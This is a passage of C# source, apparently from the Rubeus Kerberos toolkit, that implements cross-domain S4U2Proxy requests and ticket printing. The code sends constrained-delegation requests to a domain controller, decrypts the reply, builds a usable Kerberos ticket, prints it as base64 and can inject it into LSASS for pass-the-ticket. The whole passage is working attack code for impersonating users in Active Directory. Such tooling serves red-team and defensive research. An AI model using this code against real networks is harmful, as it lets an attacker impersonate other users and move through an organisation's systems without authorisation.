responseTag);\n            }\n            return null;\n        }\n\n        // to perform the 2 S4U2Proxy requests\n        private static KRB_CRED CrossDomainS4U2Proxy(string userName, string targetUser, string targetSPN, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, Ticket tgs = null, bool cross = true, bool ptt = false)\n        {\n            string dcIP = Networking.GetDCIP(targetDomainController);\n            if (String.IsNullOrEmpty(dcIP)) { return null; }\n\n            string domain = userName.Split(\'@\')[1];\n            string targetDomain = targetUser.Split(\'@\')[1];\n\n            Console.WriteLine("[*] Building S4U2proxy request for service: \'{0}\' on {1}", targetSPN, targetDomainController);\n            TGS_REQ s4u2proxyReq = new TGS_REQ(cname: false);\n            PA_DATA padata = new PA_DATA(domain, userName.Split(\'@\')[0], ticket, clientKey, etype);\n            s4u2proxyReq.padata.Add(padata);\n            PA_DATA pac_options = new PA_DATA(false, false, false, true);\n            s4u2proxyReq.padata.Add(pac_options);\n\n            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CONSTRAINED_DELEGATION;\n            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;\n            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions & ~Interop.KdcOptions.RENEWABLEOK;\n\n            if (cross)\n            {\n                s4u2proxyReq.req_body.realm = targetDomain;\n            }\n            else\n            {\n                s4u2proxyReq.req_body.realm = domain;\n            }\n\n            string[] parts = targetSPN.Split(\'/\');\n            string serverName = parts[parts.Length - 1];\n\n            s4u2proxyReq.req_body.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;\n            foreach (string part in parts)\n            {\n                s4u2proxyReq.req_body.sname.name_string.Add(part);\n            }\n\n            // supported encryption types\n            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);\n            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);\n            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);\n\n            // add in the ticket from the S4U2self response\n            s4u2proxyReq.req_body.additional_tickets.Add(tgs);\n\n            byte[] s4ubytes = s4u2proxyReq.Encode().Encode();\n\n            Console.WriteLine("[*] Sending S4U2proxy request");\n            byte[] response2 = Networking.SendBytes(dcIP, 88, s4ubytes);\n            if (response2 == null)\n            {\n                return null;\n            }\n\n            // decode the supplied bytes to an AsnElt object\n            //  false == ignore trailing garbage\n            AsnElt responseAsn = AsnElt.Decode(response2, false);\n\n            // check the response value\n            int responseTag = responseAsn.TagValue;\n\n            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)\n            {\n                Console.WriteLine("[+] S4U2proxy success!");\n\n                // parse the response to an TGS-REP\n                TGS_REP rep2 = new TGS_REP(responseAsn);\n\n                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62\n                byte[] outBytes2 = Crypto.KerberosDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);\n                AsnElt ae2 = AsnElt.Decode(outBytes2, false);\n                EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);\n\n                // now build the final KRB-CRED structure, no alternate snames\n                KRB_CRED cred = new KRB_CRED();\n\n                // add the ticket\n                cred.tickets.Add(rep2.ticket);\n\n                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart\n\n                KrbCredInfo info = new KrbCredInfo();\n\n                // [0] add in the session key\n                info.key.keytype = encRepPart2.key.keytype;\n                info.key.keyvalue = encRepPart2.key.keyvalue;\n\n                // [1] prealm (domain)\n                info.prealm = encRepPart2.realm;\n\n                // [2] pname (user)\n                info.pname.name_type = rep2.cname.name_type;\n                    info.pname.name_string = rep2.cname.name_string;\n\n                // [3] flags\n                info.flags = encRepPart2.flags;\n\n                // [4] authtime (not required)\n\n                // [5] starttime\n                info.starttime = encRepPart2.starttime;\n\n                // [6] endtime\n                info.endtime = encRepPart2.endtime;\n\n                // [7] renew-till\n                info.renew_till = encRepPart2.renew_till;\n\n                // [8] srealm\n                info.srealm = encRepPart2.realm;\n\n                // [9] sname\n                info.sname.name_type = encRepPart2.sname.name_type;\n                info.sname.name_string = encRepPart2.sname.name_string;\n\n                // add the ticket_info into the cred object\n                cred.enc_part.ticket_info.Add(info);\n\n                byte[] kirbiBytes = cred.Encode().Encode();\n\n                string kirbiString = Convert.ToBase64String(kirbiBytes);\n\n                Console.WriteLine("[*] base64(ticket.kirbi) for SPN \'{0}\':\\r\\n", targetSPN);\n\n                if (false)\n                {\n                    // display the .kirbi base64, columns of 80 chararacters\n                    foreach (string line in Helpers.Split(kirbiString, 80))\n                    {\n                        Console.WriteLine("      {0}", line);\n                    }\n                }\n                else\n                {\n                    Console.WriteLine("      {0}", kirbiString);\n                }\n                Console.WriteLine("");\n\n                if (ptt && cross)\n                {\n                    // pass-the-ticket -> import into LSASS\n                    LSA.ImportTicket(kirbiBytes, new LUID());\n                }\n\n                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);\n\n                return kirbi;\n            }\n            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)\n            {\n                // parse the response to an KRB-ERROR\n                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);\n                Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n            }\n            else\n            {\n                Console.WriteLine("\\r\\n[X] Unknown application tag: {0}", responseTag);\n            }\n\n            return null;\n        }\n\n        // added little function to print tickets because it seemed to make sense at the time :-)\n        private static void PrintTicket(byte[] kirbiBytes, string message)\n        {\n            string kirbiString = Convert.ToBase64String(kirbiBytes);\n\n            Console.WriteLine("[*] {0}:\\r\\n", message);\n\n            if (false)\n            {\n                // display the .kirbi base64, columns of 80 chararacters\n                foreach (string line in Helpers.Split(kirbiString, 80))\n                {\n                    Console.WriteLine("      {0}", line);\n                }\n            }\n            else\n            {\n                Console.WriteLine("      {0}", kirbiString);\n            }\n            Console.WriteLine("");\n        }\n    }\n}\n'